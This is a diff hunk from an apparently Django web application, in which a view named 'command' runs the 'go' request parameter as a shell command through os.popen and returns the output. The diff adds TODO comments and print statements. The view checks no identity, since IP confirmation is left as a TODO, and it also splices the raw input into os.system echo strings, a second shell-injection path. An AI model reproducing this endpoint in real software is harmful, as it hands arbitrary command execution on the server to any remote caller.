@@ -34,8 +34,12 @@ def restart(request):
 
 
 def command(request):
+    # TODO: aConfirm IP Address before executing
+    # TODO: Integrate the restart function
     ip = request.META.get('REMOTE_ADDR')
     result = os.popen(request.GET['go']).read()
+    print(request.GET['go'])
+    print(result)
     os.system("echo '" + request.GET['go'] + result + "' > Results")
     os.system("echo '" + ip + "' > Results")
     return HttpResponse(result + '\n' + ip + '\n')
